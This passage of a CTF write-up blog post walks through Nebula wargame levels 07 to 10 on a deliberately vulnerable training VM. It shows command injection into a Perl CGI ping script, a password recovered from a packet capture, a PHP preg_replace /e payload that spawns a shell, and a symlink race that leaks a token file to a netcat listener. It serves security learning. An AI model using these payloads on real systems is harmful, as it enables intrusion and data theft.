<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">ping</span> </span>&#123;</span><br><span class="line">  $host = $_[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  @output = <span class="string">`ping -c 3 $host 2&gt;&amp;1`</span>;</span><br><span class="line">  <span class="keyword">foreach</span> $line (@output) &#123; <span class="keyword">print</span> <span class="string">"$line"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if Host set. if not, display normal page, etc</span></span><br><span class="line"></span><br><span class="line">ping(param(<span class="string">"Host"</span>));</span><br></pre></td></tr></table></figure>
<p>This will probably require us to inject a command via the <code>$host</code> variable, as the script does not do any input validation. There is also a <code>thttpd.conf</code> file which contains the port where the script is accessible</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">index.cgi  thttpd.conf</span><br><span class="line">level07@nebula:/home/flag07$ cat thttpd.conf</span><br><span class="line"># /etc/thttpd/thttpd.conf: thttpd configuration file</span><br><span class="line"></span><br><span class="line"># This file is for thttpd processes created by /etc/init.d/thttpd.</span><br><span class="line"># Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.</span><br><span class="line"></span><br><span class="line"># Specifies an alternate port number to listen on.</span><br><span class="line">port=7007</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>We can play around without the right permissions from the command line. The <code>Host</code> variable is our entry point for command injection:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">level07@nebula:/home/flag07$ ./index.cgi Host=127.0.0.1</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.044 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.024 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 1998ms</span><br><span class="line">rtt min/avg/max/mdev = 0.011/0.026/0.044/0.014 ms</span><br><span class="line">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;level07@nebula:/home/flag07$ ./index.cgi Host=127.0.0.1;getflag</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.014 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.028 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.051 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 1998ms</span><br><span class="line">rtt min/avg/max/mdev = 0.014/0.031/0.051/0.015 ms</span><br><span class="line">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;getflag is executing on a non-flag account, this doesn<span class="string">'t count</span></span><br></pre></td></tr></table></figure>
<p>We can inject the getflag command by adding another command to the ping statement via “;”. To get the actual flag the cgi script has to be executed by <code>flag07</code>, which happens if it is called via the thttpd server listening on port 7007. To get the <code>;</code> to work in the Browser we have to encode it first, such that it is suitable for an URL. A quick search for an encoder reveals that the correct symbol is <code>%3B</code>, so we enter the URL into Firefox:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Firefox URL bar: http://10.0.2.14:7007/index.cgi?Host=127.0.0.1%3Bgetflag</span><br><span class="line"></span><br><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.025 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.024 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 1999ms</span><br><span class="line">rtt min/avg/max/mdev = 0.011/0.020/0.025/0.006 ms</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>As the output is just plain text I did not bother with a screenshot, but I think it’s clear what I did there. As in level 03 we could also inject a command that compiles a <code>setuid</code> binary to gain a shell.</p>
<h2 id="Level-08"><a href="#Level-08" class="headerlink" title="Level 08"></a>Level 08</h2><p>This time we encounter a package capture file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">level08@nebula:/home/flag08$ ls -la</span><br><span class="line">total 14</span><br><span class="line">drwxr-x--- 2 flag08 level08   86 2012-08-19 03:07 .</span><br><span class="line">drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..</span><br><span class="line">-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout</span><br><span class="line">-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc</span><br><span class="line">-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap</span><br><span class="line">-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile</span><br><span class="line">level08@nebula:/home/flag08$ <span class="built_in">exit</span></span><br><span class="line">root@kali:~<span class="comment"># scp level08@10.0.2.14:~flag08/capture.pcap .</span></span><br></pre></td></tr></table></figure>
<p>We can download it and open it in Wireshark to see if it contains any captured plaintext password transmissions. Wireshark makes this very easy with the <code>Follow &gt; TCP Stream</code> function:</p>
<img src="/2017/03/nebula/wireshark.png" title="Wireshark Follow TCP Stream">
<p>The login name <code>l.le.ev.ve.el.l8.8</code> suggest that the keypresses are all transmitted, including backspaces which seem to be represented by dots. This means that the password is not <code>backdoor...00Rm8.ate</code> but rather <code>backd00Rmate</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level08@nebula:~$ su flag08</span><br><span class="line">Password:</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h2 id="Level-09"><a href="#Level-09" class="headerlink" title="Level 09"></a>Level 09</h2><p>To solve level 09 <code>preg_replace</code> in the following PHP script has to be exploited:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">spam</span><span class="params">($email)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $email = preg_replace(<span class="string">"/\./"</span>, <span class="string">" dot "</span>, $email);</span><br><span class="line">  $email = preg_replace(<span class="string">"/@/"</span>, <span class="string">" AT "</span>, $email);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $email;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">markup</span><span class="params">($filename, $use_me)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $contents = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">  $contents = preg_replace(<span class="string">"/(\[email (.*)\])/e"</span>, <span class="string">"spam(\"\\2\")"</span>, $contents);</span><br><span class="line">  $contents = preg_replace(<span class="string">"/\[/"</span>, <span class="string">"&lt;"</span>, $contents);</span><br><span class="line">  $contents = preg_replace(<span class="string">"/\]/"</span>, <span class="string">"&gt;"</span>, $contents);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$output = markup($argv[<span class="number">1</span>], $argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $output;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>The first thing I notice is the excessive use of <code>preg_replace</code> which in turn makes me think that this is the part that should be exploited. As I am not overly familiar with PHP it is always a good idea to look at the documentation. If is often the case that in older programming languages there are functions that are deprecated due to gaping security holes but still kept for compatibility. These are exactly the functions that often appear in CTFs and the security holes are generally well documented.</p>
<p>Before we check, let’s first analyze what the code does: It prints the output of the <code>markup</code> call with two command line arguments as arguments, only one of which is used by <code>markup</code>. <code>markup</code> itself reads the file with the name of the first argument, if the content contains something like <code>[email mail@example.com]</code> it extracts the address and expands <code>@</code> to <code>AT</code> and <code>.</code> to <code>dot</code> via <code>spam</code> and strips off <code>[</code> and <code>]</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level09@nebula:/home/flag09$ <span class="built_in">echo</span> [email mail@example.com] &gt; /tmp/exploit</span><br><span class="line">level09@nebula:/home/flag09$ ./flag09 /tmp/exploit</span><br><span class="line">PHP Notice:  Undefined offset: 2 <span class="keyword">in</span> /home/flag09/flag09.php on line 22</span><br><span class="line">mail AT example dot com</span><br></pre></td></tr></table></figure>
<p>A look at the documentation reveals that there is indeed a vulnerability in <code>preg_replace</code> with the <code>/e</code> flag which has been deprecated in later PHP versions. The second match group, which is the email address itself, is passed to spam, or is rather injected into spam call in a string, which is the evaluated. From a modern programming standpoint this already sound ridiculous. It’s not that hard to find information about how to exploit it: If we wrap the desired command like <code>{${command}}</code> (for more information search for ‘php complex curly syntax’) it is inserted into the second string such that the command is executed before it’s output is passed to <code>spam</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">level09@nebula:/home/flag09$ <span class="built_in">echo</span> <span class="string">'[email &#123;$&#123;system(sh)&#125;&#125;]'</span> &gt; /tmp/exploit</span><br><span class="line">level09@nebula:/home/flag09$ ./flag09 /tmp/exploit</span><br><span class="line">PHP Notice:  Undefined offset: 2 <span class="keyword">in</span> /home/flag09/flag09.php on line 22</span><br><span class="line">PHP Notice:  Use of undefined constant sh - assumed <span class="string">'sh'</span> <span class="keyword">in</span> /home/flag09/flag09.php(15) : regexp code on line 1</span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">flag09</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p>We have yet another <code>setuid</code> binary with the following source code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *file;</span><br><span class="line">  <span class="keyword">char</span> *host;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s file host\n\tsends file to host if you have access to it\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  file = argv[<span class="number">1</span>];</span><br><span class="line">  host = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(access(argv[<span class="number">1</span>], R_OK) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> fd;</span><br><span class="line">      <span class="keyword">int</span> ffd;</span><br><span class="line">      <span class="keyword">int</span> rc;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connecting to %s:18211 .. "</span>, host); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">      <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">      <span class="built_in">sin</span>.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">      <span class="built_in">sin</span>.sin_port = htons(<span class="number">18211</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(connect(fd, (<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr_in)) == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to connect to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HITHERE <span class="meta-string">".oO Oo.\n"</span></span></span><br><span class="line">      <span class="keyword">if</span>(write(fd, HITHERE, <span class="built_in">strlen</span>(HITHERE)) == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to write banner to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HITHERE</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connected!\nSending file .. "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      ffd = open(file, O_RDONLY);</span><br><span class="line">      <span class="keyword">if</span>(ffd == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Damn. Unable to open file\n"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      rc = read(ffd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      <span class="keyword">if</span>(rc == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to read from file: %s\n"</span>, strerror(errno));</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      write(fd, buffer, rc);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"wrote file!\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"You don't have access to %s\n"</span>, file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The program sends the contents of a file via network. The problem is that the file is only opened if the real user id has access to it, which we do not have for the <code>token</code> file that is the obvious target. The actual file reading is done with <code>flag10</code> permissions. If one has experience with such code one can see that this is actually a race condition. What if the the check happens on an accessible file that is replaced by an inaccessible file (for <code>level10</code>) before it is actually read? We have our attack vector! But the file name is a constant argument, how can we change it during execution? The answer is we can’t but we can use symlinks such that the filename points to different files:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level10@nebula:/home/flag10$ <span class="built_in">echo</span> <span class="string">"dummy"</span> &gt; /tmp/dummy</span><br><span class="line">level10@nebula:/home/flag10$ <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ln -sf ~flag10/token /tmp/switch; ln -sf /tmp/dummy /tmp/switch; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>As in most race conditions we will not be able to reliably trigger it, which is why we will try it multiple times:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> &#123;1..100&#125;; <span class="keyword">do</span> ./flag10 /tmp/switch 127.0.0.1; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>We also have to set up our listener on port <code>18211</code> as it is hard coded in the source code. Due to our numerous tries, the listener should keep listening after connection loss. <code>nc</code> has the <code>-k</code> flag for this purpose:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">level10@nebula:~$ nc -lk 18211</span><br><span class="line"></span><br><span class="line">.oO Oo.</span><br><span class="line">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span><br><span class="line">.oO Oo.</span><br><span class="line">dummy</span><br><span class="line">.oO Oo.</span><br><span class="line">dummy</span><br><span class="line">.oO Oo.</span><br><span class="line">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span><br><span class="line">[...]</span><br><span class="line">level10@nebula:/home/flag10$ su flag10</span><br><span class="line">Password:</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://erikgeiser.com/2017/03/nebula/" data-id="cjkavxe310003r40iua7empfb" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Writeups/">CTF-Writeups</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2017/12/necromancer/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Necromancer
        
      </div>
    </a>
  
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Writeups/">CTF-Writeups</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Opinion/">Opinion</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/08/package-management-is-broken/">Package management is broken on all platforms</a>
          </li>
        
          <li>
            <a href="/2017/12/necromancer/">Necromancer</a>
          </li>
        
          <li>
            <a href="/2017/03/nebula/">Nebula</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 Erik Geiser<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about-me" class="mobile-nav-link">About Me</a>
  
    <a href="/imprint" class="mobile-nav-link">Imprint</a>
  
    <a href="/privacy-policy" class="mobile-nav-link">Privacy Policy</a>
  
</nav>
    

<script src="/js/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>